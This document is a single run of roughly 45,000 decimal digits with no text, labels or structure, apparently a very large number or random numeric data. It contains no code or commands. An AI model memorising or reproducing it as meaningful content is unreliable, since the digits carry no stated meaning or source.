009176213992021786727130461268747427601080622885847830708986622406502548810313907049851140928376658891259117873160121099515600793480055761358978099500290174217690603733899946045950617763868951477931081898223166652924483087104677384955451472440184917835907384896397078712689346234484041918165949099835276542329241264230840520713408308456585762724450801771684508729494610482622937361104339934295855667682935827354128780482996325263935076871460442838124814858888016279294169781927069380698489660252993396193763896358554718479587633890055022830062210632297231511514637736602187358215594457655413181627365118299329564135852673441417346515947011270341900297720038884923076249505039029690357084837453440043898531064863262446673510439431837230555181290962350494714603196488321245484778995420643797282721981747189440891105899345328211231254973360779521871138484628517425513975784976476325623224152702028341581829061016485884883198282626091999830464214212096824833550631682897868768344787351043439904744300315499030168801608710085671567836610828233721053655537988474273187613568165536155285319047446994439616776305953058851936207183844354730737408627186731204953936379281575328175432892845372662606430363882893402520386455837636129339048301674494498034750433638788008349557604623279859857134656022272606639632861823008257758208558990947518407567239407685898024334294826175545249052329732793301545463918775729212117372598790895507497146494378593046222782326055362972683187509452943987120042924880079049555356785734062515273151803253135181062953237596031483239015918623300145242675696048638634308607719075181624001623033314285518775443940447890017481015157540811781715372961753579747832419691174984319715318081317179591467171119810083840336978780916422794818754016013611469819062332893292236247132440788672699871715726334947385484588806388911526448249760327022838609716151949576892982691350181636325598962867200138050703082314127427520750656613360671969719816940544665393589434177060552345827665544000112755562937221388011084422086831131140237819747345209620958116228046963880774294139030265717710005763396351821800124744747149004259222315524769621943441847255958120121057437752519508134149135422415058659427889978739167339293396513159104314571994562506845979683618963806838515984498561115620034326119578755826977100760032754160647343736949843110932549509167227206400508126426014294126475616970636029411564421680415459581506107785145769750445535977442908517779118063922400446129258996380327945284636626141759622392121723682307576961146823035239778962816294398002768947315733988435588706110285515924733986573366006850056997281310386651978847100674677596483357344902820421565096947119459861901353996478545330146051429135002372420984769480364676920469926447292804712758327372171939548005796526865061258191821696622018045612609863653174211257199306381904423397578711628051855558449645430716080882285471714369663713028233544942191343413043923330015005656670433776846166775029422784934675063979546204737673787072324117464280884415893535680608415962676638404984360904818024753357649009493435441060636779318612150040094727269095313735372110443151170933130764550355926268832665901175315063591324360485757949695827639749894284135513725207992268612214239709021796747224408335388098100701623269031855731261604246781761331075593782483360863836226244614242930575187438787386141530508626571095248954014924232843189233943145282970918038732894550254606460480052022466581003185836020306860517745619170470713383477706629052386390940244641556721650662961993586310932774034340134466131711913351766014059409623209917105705643622351048722761079706877898612101966538974481628943011046562214133569675940178904716762074405805693358283371699279458719666789515712553842200366088467538129101773611154045296758215064192510724948642218100839389015904455183197865881112325122536749138253933078370073173081272142077660312777409058080944919408197105811183847407001814000853251529941805652295211007158117073837308240698306864490746116745444440714304922030677607159921522749254279874738264780918376762341733082719403931323466427641459973836475970381301280885033626062998207152722028542120058011656051194860834218883661348882695573523162434435015664730431486790677784879135416085680151669978877061201745548637409597574005403849723104766363033097542620328168719395156158520890964298726312525843769317619727592900346538642063711147015864384966257863970144928487980316952783748538350490056597912840993599068619734264728923242489130826017565677382786305775976352278314846336927779180500164622889699123465779291314876925944288020139628367958334391785905252391952941534875239303463110156654306532837075038889954990688654950081257963806181816853509208537143741094944757039638494975871644681150670500214123518340281676634920109618912258403568605912835033669267796737103070281929733618849672046750140156792492113494805227409967316117709102745249838883908070858842327100644980123353667650539887212638024423008460901077635641398220030593374126889243415336542025706948519984471875418880793439501463466127252441773757149952565288299258107969093316104382308560138812012296812696468908122639766877927492814462784426184263584201418331902447832278899809698239651346176204742391068276058321755457507921658036367273839007910459451004132901925231483621957916798588051266020097228696233838616115960524992293331836320027845766575331376142670839490880550759806870879826408977508829268977624926474635444984668894173599300347458180736656430266826592442563374413270899339775973101388741200390043190529633522299987879691435811344425259779803521595625077831025423480092273072499616636428320500874474139209172397074753166048376374852684208122747497634569952054931369157979112429602848066070103768996259016510043773039509456221427465818306914402351511662865596706861994618469957591505743345087637288985533506266063211415337458439707196746387340399993709915774964073862383407901479583181725620502455848421473849426651044704774063242031897561736079189917822231642380390200894101208028691985961671629320327640625260006951733125269906286248625417367033327600312428036635791459549164761914619053937485149368942051637622714673498469773139956466045934601067918926254224134136543664540176613574477013963481185687115701357699581640047909206108443172456055619012831163004446525126228908419640434049144501464521744405734061624478822779971501310144341103442397425087991280771311624912152789269935746204203768777376385669560416806054576210855758917135229624996799025675972855392456108749351406167089518111329278151973271487732497680009262624207734628870531374677056320489302959156635380744709069597572222429972754586467461537695552082506996989577773957074718666890822497490143624744525519044229680328537678494196389711410805089312109278676303196918383911698004134156625433836799674131539384295941799758498611867823014800451647580129637364720836383112407690035979219253683178738592375690523758238969827084766305175763459358026591513498087302013686348014061536417530820271763555991754202095496983416922179272958301612369513966515705686540241946946516718365463021468072706342114575915845269947285170113886567958299138869821070482006343086907854451672913327195149837511746201684875747764405222709602003624714646167523856142265781067295529417339046576983860859639145707065322846508409543160014022939011379246905096567853319695061068584712044441920604761337691467337936430180747998665161921591698656666538804444119107302370519237002046618734287357041747082737549853293330004577620439872203783881605243689331944245058011868251221278478344559603066929374243298490348023218209036879894992874478725032591596189785850944812379275491234644463338537788408193643968889613396929112178659039992843881063944159558416762968178120971954981212797140557754492053049379891180062175385835036274955450333757121784014708439191751950860585349199959691524867553164316242548786071984302086337859376631261901499916270962268585226578122828905703272862835411950297052019362069267741292401699525757366199508092849423505163658883715917902956177057094522536609968006819596423781691294594692864540821503968137430088269398861477937339333757230996113288660543251194237253475243002005679546576154678682007937056958128641306173396397084950119005842392053232267189329288453628870794545579261342601586963084097555279066525101028726936719315836577734975719063080725090219405504610666024422926250292860593322798419239565496886013340668832316387682685091679039839187072772076744276133276592846839981486106432606437650144747818764480277258613169859318694100440953390504856890322777540657248960647238825554510854912031036332877491371477601826069398077076937616672477314266222657534772695192554824440187651660162751923501421477184821516927002828976301771363883991358691960043649535055558462237630305831381326730354110182747268565216610725364174449785584546511487171336102403554809978778511828886289153790069820629533319851835730911089412275161025467131896448805779429717717725300510407099363442922766412827734730349973680125122852371686099508646609568462397278953618059500957189149042613658080426492560005775362479839339450863656477837463592813139240756487075728564465197318280822903526330896076021006021727414089626081541900547716395309890669407926414355189291644439280234406090351667548393825744284816791044748302400239483169502960847889004042863814297977086278313996708246008847182133561793057182339922994571279940434206889821080436555050339209025971969870232224994873746553489281000009439445389745802048624488707283117135251173312346842981227219522017221712671433948045200021214450663335607900033578092546916883366771930638967820688648907811142041387104420237222802355399022598892409282229922741148719037881696684516922043788448566230346912956392754385486238299530020949153835321791455049907957690937542501503257702701986631037234096882374310806801313886596934762323578298300568333226457283288772390379609374498345185605231152296488253665464601886984547425752395124138125449508251299789047848653919946702362282813307767626488046049066838771219911182224894345383575472288972226631486709176753226474447552331740696180724679618739473773585012743144038623668715176092902017733551555492380201934716112657777753950351332748745251590430075525612052177749334378277500699858833269907062964305725318853038790317935851552685835510207297416077776011624046319260119400378010926499307995202255225853155704413140597847692290734781064969871406702202684635862990159416008481808462504397183001094953334360932848801629127566338279860557273551399830026647866785322948287909910018443464411728988484689899282420141338750640444725300887817404311595990323375005320235345593729363782989112659288592058064802741958976557616113793643995470580670878614807877325451185428437401722564797018023350333685410800002536521547695221917346492318815329786018819921796040060609616686821850618675877814064877834047281031356241349148570257960336236787693445991868017585881514860840699580898430711630958200422274522153666602765227899245652326117894259430267523809491285339299126758800558961398401710614102310624876523554567359095523052775621803810453618751434655535197662195729457524292901787632717862739652178567011593690493079044516271602762583837146651594909408571725904800691641855453498037702930303832116063220035618876802409044746818688038896520490065778916894031165658019054495023720375072411581800007744472563382341664377456115155503542975916539664553856526113572767298326585794071832604738851013161612887934458536195703271444621278975613470432377223881810047984395039440229143834438464615479215785218766291152287737612198163602573925214335358540717894920848122408702570396786542510366286159519348070412602508288503096510893165887790541234401973465050650049944523528763044306594319381339341835857168558805484413055559000402748281494699956152736846440330395113317183914934254190094545066154602630000386588690640623216888010076930083360445496802588168096699722701906452548660447096408821673459050040349614987427953497313738361111450733108058753873025974106138681098485833072120922117745362727590230581773798232758440624993917657594660809772779118721065814676862237605705250619480373438628138523770341979273316388787363194749346327862293177578812599382681167500370224032953783159518682721133064142091905281629975782077175377987346348143435196323175216966384211418108496211697042394923155614312292503144006253603660692055974774657979243871368841578782876962946222477893178712335562736439194379599202766317520137004522514818475863905779809259981923570356981614284556477586420440702492712527225281356265093661700348667379642413869680207116813982146578728096221288273310286751648249442399195663123152745175021473314465885179601609619479300280372711693536381229244701133173624771697269261956932397891100140251069046871613394584263974457968148866849200007817744706161526567428981185587087829504483723680308221357012569465075745363481291484655158048784020390502100259275244613168447522479547904671438893800766553572800806695730079028396382618409603921536812835994398110750706726742869800660958568016105972826379651161350141133723491913496840055571820387869547191618235985737690297913884936462192253289119210269423239141125685811457220853557617415846289198977798800250506719948038472788703527718790898396843697941796931796295977751668358113747688668176768010819006003305324929469477521797817699690677836874760432872473553068462599504351483674576092873856008713143994636053618354045686773974816246951572069453638974491049351146966876705819138512575919085783599187232928757661147972789085688127552376944538283903190990652071491922470957402779695631030715181420236474570299907873635716846765610470200437115189662120360521959932054801119890167420836630875978585833201376260216550558688869885713054054796693006696808047515134776813062311960620970617934580108006588744252117024096817204978738548068112224600925471160062384644161420520930594382105157583533305491087901382406910773441932528743991109138897564850931540740964910577504039925164613465467776532198741820034709649606228471698314733920941004736042218174909289093774527504661115304652974697221335339481485353472649813374794495276818873129456984309076580445163181039404646491053737144793155403535602495897989541686583849679705044113216308988392835505702801733252280518874834183374652309648619186038013785111270136903893792352955043667176322014228532619285600685626649359841948436291475270654603883617539512987730570566772262303584184808182583362429477728385508860269000691701519707482291974329507430762316333249063989438729281532876284644017563954270855898451509304107037142102600929965997582753461297307544662280246365564384499445568873939849316458035689202886135327542937568583668841006234818041335755640423164505758169475306533107108135699543540014879959693816582346612759968522682742309900441327274042861530506215482018234838125228016711690103181181102286147652423977840054875957719503779100393313546048153699404917724682763394612832305436747976221704715458797546226909007021493068426907959968843194509021567763467866118048262658316740373328872218197393092932659649873478596134605047617698526837215333571868858975119246874554156979185274531634164280650247824428856274751759761326253594119553720775741005775555260289798314431843016593772542499672822481917070142721694749645322493266562334010651907851563500895662681882314718849841396774634470511133198512041024345990762271868637996102272903650238841196329677368119754343819739796598007783932467792122693069169114543849513420540776042344291502831737646454287339446076792283133498113353246708747510351466951453051355295450056171669410607236572855086845990939810434314998632117015056599907807798735078020057137532594030950510234472932963559723774901380936959329686213296703345950049919933462540455191374046755081201926136002164933459333476431231397622131737294760669367178064715842125261415469684101976196236743838945629391535391375401803117353290225185307559000720462061504371609294253472296653289517531204878085862698705859922170773960705724652539176091443826358919070618301901155156702959961802926231439294268534476049557545369888507302203199581897004056358054042367093670207301669113199167351006009160056615705036569432257131235922155039991189013347201943073849223506134471419480264089207506562333870774045903313936254770420671981749452618299660972716376573583739850695345380575290274286009959270827121534929728654380521822001966235391177802770640456367961094613136685126608035483208573763986636888273456553038013230044314287182385523635284309170940988094437968951599913097440550074612163946735543861085934233242188720869810188244332787438227908482575735350903252836582266092838967076213181647925181529620406260681376728404269446364171036799165234868469115202710529228376944675180098047032490342734828416255863445177585678290650103658560072342298843728554909468970173769462876703868407072408444221878956493109914769942417249924613126649145581456825466536888755263563815864895116589810278893858805371700621601503051113454209885239618954623543620186141839240801015560863606642871127587503471532389524708183686068135205551077017967309735478549599262072539469995621184371373473793718857008235838731698438085840696750778444803438721757426205640640507307006918261013607853800509944525707370530341478956575534180110098503933983037903800624649518705123721477764873841948551902809122473905311602563903658068658014089172284685123868906423878589550601905931403612447534753976857627320090565586870135164566894581979494633574717406219154840133615331017575092496888960775257440798005886101782580186406915968566567227634636962414194891690280806960310152154833936076667274246891422254842170043620367167559609562132648059630774400456634661438636203343639444812307670357915344172694476372545374058978513250746753395662046505505605387378034257151673459768513603832781720148228415693926640111018121704682469330218194993674666728674781897748480679350864268667555482406716621361951284973248173971190146788283259006084640549694319039802850147080751414410457473100804179384109649816826788185715502008667747937525699241515822099242924334760174739569256607319376350868150457901296684005610337512652556180868522171197854274921733322317428339081406484637382168144484737161495647139012217348770498254117143771114203937311800709302136492722324878636363404215162438059835426893884965192873931978436651067006625843464733542815701852699643967083563331769982777538070958754136742291842417985431098777122182496210695076280108956498106479491779259629339356279957536101705152189759875440922558805432196343101085312302173973088114627864466978060018882323482205817300841635082467402417240407657479328938933115029682979547817569827045393538591443246727662970120384038049602831016018095973944014702491213550617193948182690645191319101784184310471041263173647324911923938974386990233386878142155815010566344086845257231910221081056980848924347868465660516883053378956071806843131146077696381512167701120669791591253001430625881908871120222310075835280878587995374426998970764106547358182083919250278792253909254398836050005090737233379475314406313112150507366118996043517889901604748425416500228204169810229493376838967248701982923866928463703817058981902746394044283572893896670641389463626540281729199475336905003761121588278970469114341214237238283044903284296011950370104100142668011927107961620788784160672329559818175583989133251375724219569604914767567952111618804389590877103659492947825792423795044424130940832338126176081140009276241894124257496313019986512792283184752048357706646120921937506246770318868613794991377453907812870771987821540433049512879877559627755602105800802878034848233406340288366146911171337845424518536188949224019032104043282483408336738952153491022832513522374819919453546568972178006597360348315862126723235351953350516048752712060283164722935195839918484707982109029482899399188104950035550387951248592033327187330888472537989105694008100902221423887798157278356637214309312369273075792301567380581606227722338113503372397025290361120769824677303375519820554141149645720631531678427106975748889727963024627168702416859868917527715336818040314716475829256251495346468514433702252288059176333939752116706143937865462625856173703131915597911889207937251004691959185740737281688143722120321968340179658024618460052158439636891131764609996236740068175576616877526347459238414733921647703003143734543170479975783599403506363187825059012955422685075779639828226841810957218396741078849890464312195959082275932159686576522264017815835896107966831216954568808952922506817940203630086965670685972458054179760174950020326484271584665448121531117956565677040617680426878795536457294615615446073670967036431519655106434807003809118452305810730214043612330912595523182149015038102018500134241484723504366898570302451026546956348401585802971682522429648080984034144585542904928884648773401312573055373606070191629155054993661334077312398209929524368368832921951140448543106640861945396864151395769207199691720359686120293333178386108839294722530042315616407137449848342810447111615272620593022107231167710039273929266317441692634945101127081298848244599738280037378589951645711995273933419008419092864042678688209333484803084719040284208862032249826348479100974807784767017039602471356768900231792252825470672583102987646052002042978040933115685575280526885480195057650621901908901891357912441125388587799232814560249993489366856376325502322393059153024495063028949230968284629071564799283750547811678926036676966738697164784870179090607143621455721419332215769048669089757195870184990191194395140484085767551174606970731632842702467355233583675162976089942957286244262667643105805808342876273391822557761267507284433910961587034927750280178337841669860191835435408390155288603793646741348755830517455633961099393362422569950900096928696806011127888433415659584626558076991129923392392809290040078745702885152860362814032357472364798753508526801040308128778112133033674736653606588265769963678965491733638512457908305326470164615876697000766634598600589180650177483553907643501369257938843460141055216687919667812992837649105497810313822962588719617800964230509585756120556953358725406299944722586923486024557950281607605673846038461279535690875224021167824037222865426174743071627162172798264232970626019666955455034664738859221253519798632443927420392635117342038032668110230870557876805462155296448478264632616110393707318415949848225897312106081498265071294391114814742190196803644817545590344262674471913831551921370073206017473133615176420735478107606076411810423236719016113467615934760016479229454362113213709697185951320955704153801835451994781688915777224161021482644097408445785290943666491057641738784067905876707230945784286247131552221583688687608260227265912300199479736610372644710031368995035002715500280907383059745386078208075889023729527895685829753059168755189392755004611577970412752409398793216987446573758836062096661175962579146438542854383349530502519523601804670262391593517233300744408927706585786710998404828115781293548555763130537702332527926300609870996319229100010184745414972920834499268993564349868408659543947119924946025717801939922259757424578026280077024237218179212399245567711525415679408127533248973263128342162661588070739571077308507384392376346868647908231316158152926124418752085398997577584949620939373637022373121930946255937941403702075619108134112056442840822397091470639992553042636968479657161331375318691566154925838938731454967691988612932747088592746291868386957729529060306604405814739329383080033518035912765770919354022117437467043566458745806422880945514067866838913068783793125497444841973634280952662535777780673643698988224316016764062094623645068102823845777485213224587258732709290513549886901761024534111534018627503571022537039964391501740017136289611526481403574415330110197376152564054857625990553944619222953935077073297276377339241772093219200109521469697496912810766067891156195955663003433991489045002488870289235903058556692872011722350901910194802347238407434583269708286201586693458288791323833833342018000803244665405176051591240828781510174737789342584678638811815524861426175624453793181697384713367302553945928336478760585209219040897113718082414726071568743731753528376526225269401620259048588703278357317010918711542329481297673507152978796923029865312019175662858849392816255568813937081120066535755746178197830427802068153902043840279952158843795465265629949189889236502530385846520468242760040438148236231667488533094993730438752080723497647404674356610844243298761241400399580551470496125051537146602165654741460152769712409776919291863589774252044782339932319836208950264000172513572838329944756010023053003356910183451633739653246233836240119725935291466699158947069785304703052779383219253876518920255677188360848839113818844949992441085069093773307786868251148840766340756268868656584666678465121657960739041131169463966114320533531435553647552484956444160232401635576941704118397183309732052567118307480441578934441455291876909301594040501251163244835434961395314420735065415604319630127586438935871338587049139633755925244187976128214313714327612058277746371328015778235616603137866012501513791520455069287752636637590503125413229146307994365852869044391062358960928179389998585005263949492381442354385936323687248245486881095155584094046135358210135108396512184597237574680899557698753342612517389188392686041115756894740323102236107458946958225148490307483691186723108479347730335140052039093447991420973961496961330583906318611202132399373674473907992900022025869874956589368117920770309752401373941643836433717921869891861713361052340480580570234270858050966280490209037777830374151617604686029923485572072943144417886459563395548530165476433238371121517095658025419300170029878848342783701614645712789482785095467194435535569023888191252698378891069997180551004696601396738648503927089423236957938000089146327043641323744670562614784007597647564854645803407153015655004461072630723581551337681333995988938024134005515679363332555259948365574564609410112822246579776533500018955440849766951929021951788142578506894000966501173150965954345620945642945971938464552329195118466120244589346179426193994360309326242857857943959590085425790998544741635360025245359780631502421069731367703440167158559763948640163445768047408356346235286432672414253992635495702038905943276837622009343268135606924633209938525417968818972231379460735956275905739241596994757483261332164805115217716388144651727751245969418055396378937524453652386826671402253412986908099035437935356060950238147392927656034175237806116941549420945609562636045273095321647015512953353483987507366435110355457477993306972271024822963026271605412872152730320295142582256243048574659695081983527058972389453741635342816143154307034767630925616583349653213025697859802493749561980226354715359689248455451613147150468646531088939532041100948123779630377014005158066530781839347680904655297077031928826362768593022357301958182578345848393640537756554348420821531940197954412169654734245340451419202217511833904740063610876314804853284434747730539011958402615165526712422757410709162230812746836997180568343527546702378342336949169071621462175995177989566143189391595534554992887436952523962692260736075224429699387017125879468653076445404182105801503663615611262163774462120568453937460964822407673258191147807391494270891845274443962768394079151915356429934040586275663737532623933227700417092933725088022938254308792224532077098727342150923807272417391586399939583106404756548302599426800983871674789148074226080528656725653122221182966871776682637056621283421801383663153544935572694740526553041819260536398531307211763789242088288124172365898606020122994367345944701478495524448943538571202471134370422705488024435293079766809850308206022184883102660277974061304399009448722268843505303285779900404650678821144505467148699613025208783866419428502011486224413224608818279812611996746367440329832487795977910042080355261510205217197553511471452086349781993314237957131524093906029848623103744328894538241475795728830554664565010253029458330057776473575914873659086531250269136254751741418375727993315046367342810698977508275963113786052081070573390749746204105205740245056707691796430254656744797498675539704516434633691183760474940936210936210629773925150777694001995333158531280868775224380407464802933189294863801548742300354486674380798923983335947677973957170539234778281220850398958861222112306985402221293974202197743915608476598198362959294155328381517847814008957159451312483031055846641837039281760304234272637468650512725194386237723011214482329097433751700605317662681631156130166547681008640261385080283703695510170939372971215036430880589559738996756455843125862555418065450349094044903481495942989963830192780465124124924826463068431383674178174069081267747899758502938503721676854388115286987811050867535044322883467471556071622109400228437339584347656572902639257676223505426050402443044008301463203067494450788568126910618994206142188205039568245186700818926163930897422131979735380054042531930872466828963471943405241027454785899827384802377822555783118238715672477238114021301818363435818558464866578175994642387184117697136410354763737954178601517466615024094538123482295545752925509009255262672936949379541255890951036185131976555620536622746516965630818094713225240454790629550172654816681096599102917578950955829284523077034791709975955528684881757223518586442508668309384190461646760805665880710950547743604069299470612179164490461728211056935610314799055836921274213530746722470610372586032855864496334469672149906194036212835522284449777548524075041710529280390018900469928192179020316880837830069506166265308051151588834290823279991337239454922562560180453442210801159427848872554772157546868333934609662706300863491636290039683683714246145296830974877234579251236286784210730644700261602763120796460176104598142503735102253482889791797111287979541187853378019603553211206992771807323198351351088032406726462989411453998683766593101284322352506972143379973275044585398759485547485952441660020265677745353113374798158229337625680392638704002709497421234682765276145544649891690366012530487679468336670518215588681333647516945744247681710002921759579460624974742811308408466592158678682802516636225057057525201373375587918119660087639980554196980885724420243022961641588186034296026146703331549078742012207164369610910697672394001249595922589630643513123738500760672139965593967130903820665496898584418718400231382884019943485915663727375732202234959339379558628221121969622081991322780678573604139586261413606308869787857875567032131213648138688971359338515261829868276978548545366949823026329282582698955965334789998407285213195649367863641655032560645947433637785645809140430854287597539884411600700853908901497987491845107881281241725681630872888213227840693163982719784014173181180770462777473637786132861966670741175036640479618506782289807792069154005505053179875753679680450820377286497595703427969953073170033067451874648323290057010466601590053317975917919465722570774253885463313257941154564930811962647854418802018263743806383830464551699353027966372208276390333516094934405137848281872969473870655731255557634906236657996647958241688272154950472056626226633169509949664174613464992228607917504611069999405665873423428832460049634432117005322060386114261284051227917607126131261265235897234949408729367080455662664838788530849306536866462636689989021266791007822323468615442612974895239052599230735653726546923491229130003623395017941173141421226880511027717086437696159395989260648775727594920911193747752796073100404529202248439367873793395251859613916642648717452715928437044843915266810909890104584377557537820094062803300950969354750264766309709529354196249411290342354520770734416984540266562943454986511243537153663151105416721137484360845062129751279289875018368835829691364850925307707504952519468585346380753251874334644594310256748603582250090674764160425162563142093089803658321348410612642482807870598103511494177664975258619414130075685500042123352939542567915991368597358687285186593106382454374001299136656212758137343506229020587516406479858208368175045826888823637095229325975844293184569853599779023864401525427506172234710190300119906407693297989968823660927261412210868095165042712416299798185291136392751952548997480261463463588872096381334947755915598654137729282276555358683424442283742209510400907431257081170852595472060910712622203609664528226799665728857968695140026605010288531959237057416927233284384024251692949957400122903981449218936222628428027218997284609199346121553905771609048268231745853324757464056223331456334769366597285533967586615584152649585635113810808412591567990377739996208539550931159311818383809930359768904497471963324852948081069477960509108924110272530539084979859303209984390071898461860231846400695203706942013723625258025445818823049866078981579955807639255736257256905656467766984701227590254317760155663508587976180112532428545311348551471995178102738380086096355988770301407530342352249402407877593311583099575146472371275964984386870143549040723242825291338865810544960534471735857544154516210108779882366961021914580473382613069197791099939719423767871260217254757980620101193117499223551420813080296462916566190840905976206567928253680406774617092896756822859433860920429577270435367483266308222938975737856869832911484883491030971611245627537550030138919231851715278343968303624201508277786508618980448151453927874949378054318383174478464231207702454274629432516258102656683400660649634116794112289292273779655189178341421458330240218697502141575985582100665199356981751901482061378494073277197902782354868800326301690069510205746201254992366921285788677184318457619956821024194223224779164667640095882083322866861158835177192760002442589211496617979519713947447156382251475505930350669119084692417358586352606416499496950449955900572245501977445686789015409527161545479104195563990657605586072987082209073187570136826385738032701407616208583937523248083753696761252595046447794962561751326874455025844998698886427116595423983221647107512929958472502656040390081521050629415756301484092513205014344618550162505384711095408459411328499713544369252195798227546607740768536689897532293879729114440136771150888132048318745067727009862439381895736962502182301597137478926879748384520815548158838463525223512079150252464040592973804300167852302114683726616321210915994531489571660436297321147885881487665369895153883851979147703544339579793434298793205257179127802519365508679692839557569013471949236888725738711783349490915813949986895361290543901318838552611880022367846385296841598190778299990397868138755194880637888252740562295451645904268792841911289113160792940906375243570118724837320276147878392909008227956462350854197510791694963312387982337280263717671208038929516045905553799199692642015776824264514674021141865849772601628997647772219974839674892867285784369311191508132941209534090908167260000038270944936825046343204617250780503828318331115056494377036134160280150190097005587975435705718484388174665068145364483263861130358460785596087344421983228158515037489300288282570846306580367692076329153708957093648316120101296615726712506480717910774639402153504390764622873732139105954742873467211652728510391101866631632492843982604309872390661586432569512734513321957522227000961713432999435679782082988334766520752838284395382844392420625233969407294825022835371559326041728258113810192488571462528338163498465317619511423930816324224788980191454024659930126825102871405784255995195478775920018110894577057139836239287497994174618443799670859117531136975765546180876369448588665889892550100962574990330478169023511189449156266648072648547358503524848290974585436595316144275693244268891848159663704700337473971607560568675183853228890723517623280929599410132269192046335069440755714518115901617597463783433627928531952193366232925029077951755917566491849530130507397881252338017550631467439094459719534761745981452983882310575056547868472867182254443398831027863960566419166624391083889550742271611038394500756053820069976592467981862079828796575919597276621778203866968473092774703613284240733543989874297003636106757296564457367419643300267890568750935408276152715017653681090765889986115911712052953573052986146702434192482809682354381355578705384164638424057227296047036249334469982003508234302206387667265076789708211259930809243828931994148350045476685604942361878555833518701419960857893308829890375724770812972333223420955016784621596695504129971114362063476039158389449967967606319755170055525673416134299863003162317450641096679128850794362335051169668727640102653458286657267186161132896015181577333908858517891586590952523635914648436800530040033861432019705395789362572988286091565713617416580448498122491872007101008382040696357735863838200313238746284071303409297581093695223837464942989479030989023249216717906322178995905256963425459896972208987692822500462622985061121107665556758403505421698071925040012650705026440653751256823665148632572611896127550778203895755537032722517240601123246245262846608291883937473693069056602879515356423858288396647350468931778849097078530292093419188288872060888089915130427476928913427673290761677501448921658387458313661357022202822493864320810677186750481681085719620222655878268549437123160094143025942105968774335118336650442661033324226941236969979344101495026699392794746181010592813729006667224154691960025329826361345697228942389751524453561875405173830710899437242119584667005919913645740503780536183328734742426552950829479870196503395825689110191037119681657383996688534688090816809079356597916868099028504950572789181865212130281686563548798012036598410732702935750005871925007917776222322742182161335267079512745794128914863783578483775450427874668090350884055525877188259267088504521273340892921878385512073803901606677009741526400981499960216763494263385612673153507076429328093645496669935165397231801706433705566337270954894020190622830271083298036777356364975107811361975685051404440647411377496929510876213974994464473487859604495663069924032936060227256170639227377416880828924385473689003962284044223411630524014020629911391787505679194832357535760890554797822871686328224239844574282462529057973392201425368182558993690927493942054796836325733193019642968341881405115559827202747016467300913845774965306272192224283980414569041910977873678990907124058926041384703447235066446825475871823331022734625840909413843055448653713877344885871024548845210259181312810811676457314310196757218325772912808547029659418982433614530043083164920594146763291126730689124117756121595417956251664598367506543606565639388019633519697836774713534486545240372426901586442264448523527966398596029420977933354079801324200599904910298780245146491312990857281534298127437126008907760703617029259016646324958081316592153748962622817723416821327806759450114011775941707524411367722612480933409574424015022689852473160786353401994190396305474451018826597909589899273741506416803680372676840032959233045912750312777769114298425261814097941559943327982851470256212972208334810958411876238068974858455387878499949231856296553211439115306389892922168834865305292291087037887703880375167541805484908745906089845369652680242137566023977320267834112501336397006494919716429610161965285000533414830734923806380157643147803164434435701523495855800592641210573765845916511599705511335354162466705365740902493321533800007456035585441019794974447101390612439850870623941625894857269532278051202136113580539225857247645273404269266469070825535182522531801108845085826055462985600443973806717907678066457603534555175664100261362501844688441401830684693146793327357255368965821395006224718969019243293830790993840080278311015391980473019995200491098509049397166452767607561384963082043214013825412022519850101635000775185592453386576695411580195279721950946177436637524402795547122212810047651506828051804438138788666126500723875095644666548922838108033801179124987719689570214491319856795105011431354679113775627586117763492192354294348324716112452157043110277775405359818506313548512040383416439216536656362456829541679283649883082238025430375622969922521690788706090089140828807196999241476369381998512441577302310625107299520120839758299496427455606238006115352877630193807743170820749977207404678492494211921621208681505959973882123753318527939959925470585104085962103352449955640260029175821446034002134514365783130757888550856837689833396425357253577805398275948623821480167067479234762054331243238097001680430167059683555644279000022560003209703427080384904658744869620939789016248467415146392681062346074446071371534661004202717804961991476076088329862862603436315075384328072712996940667644416997533247153780258793593930507152261731842742408676920756818999305138806665456687136643135110113169674912326584676937782902153963033870827138397339861546336987030362577798017648728134045194794459347473089290341322510520622624620632182224838630491956490093300114555990351294347191235613002479489633459784345984503404825238929630197806745049737370330150337443241866722100912840402933748146314276275372467006982177558079364234273185819860188725714195601864878269356750464104876682792769924264660603164613094118214346033155936433218057128889327294198429205060990257068892909995045305556402404781722173519084171119620149676206555441277683449085636585796083210257443131061545770528984390092610814538023397748460532781469965105732821573404806552260578813068883368393934750336285138135909125546496131297614634239602734573135763032575665655309364406611726349472770339989263979359755066542419818296918947008334827620331875866460377798788289637464620413930021683759948470733755674300276749218934072238757044850247642794005479574561732117302212140833010860705924787302209175560360744622775287024962495581278480319356194156691958563363205761316134624087367822297320826601704369563456031505300854492987081852481486096060513439312468312891269515534262435061546041875542068583477681700241128559442238154671825255998081310857805082790701312508958570623688216101305376156090467399162699063505193487054736307712878437290695847509029215584801875514444182010410521248496314322454359691669131969979261515769913811260177829666997092520360989640207454028880893266206162015744023038542304966010620085652752910722099710650815542858787990970850519199507035241238424566904042543279405868600269430151605484079468954142445801956391413205237015654665572896685953428098589110568205773866849014785449665324560394765302536507849710171450523679659401047894606217517825547014119603298187884161264251201076667553839896554222629510113217170794543944460761028236741234178632299792799088076820883861997609349681718293646945029939143297475662375467176852363028124389196493439993900109494800557762101622172728915787098773205873638681308537998863648843348838652033573206731511389163724218622753017755649638304413519260316979611023512115832053322746698459229784896692515182101326819821374325434421682341960236421313604640351499809729737631769492326449466831643573778874520373650702962433473498125456575385190110621076703265127879543643965474950912870676609854041940407758222756913865256637019459581945400876622620545198416765038206811527596695305970353444424607875743935998891978942259883283311923079601963140730737269134420929007866991037204995303001848759876772084763275582256717340171694613093159476641795811051513174443677355676273028071007480873332317021678889574668225876256183110826023700368794660399680863226010491744587768502336416397177745007668015704612937619286237966541239403598726256443459526126211525050807957606720227329326638672570567404623630156177133217035727645575625177264275768329986268622045041970250340409340173596622230642229205400122812485144169205988824830142778799883787028550723411297020505575351996894640167066181117896969928627132534737027669479616978128342021038668124826073928344523619127553031314257881289475578983343325848780232678668380347254053669393667462959655542746467889859658738647593724048770362187571654228502660249791123771944844902498407154607342112899889430566941958076916247889906899045443245481935149630610322330269016096180786861721798334364884194999612177486232434148374808085055607294130854072767413959613029651039657442487658700759620901070181378050273578259705157158909673312143036433024649683312733427069518846284980623391091224807348528727420747330182301242475560651242951410886932746333215649112059518055003954203378102966019776795890491396239817577592307252372402881979941761481436994747703025347190062394626582068097459283624213149997978960317152199030579940775440672639757226487090976552047524420468344293727063114344624559373702572658491176210803261793815045214293733945494707604192720610965696853006351417094146578202798658787177527255237533577600009714853157884595441651103987545444418441449966743998790411441842560390074824508866657816003988135532372881307914781066080448574062905413790738048430943302081240356315352574233931000220972865597547676429392099550607067756628974641093266459163816989605462044468855407329444424428169737019644357462300288183153665878725767038735946550425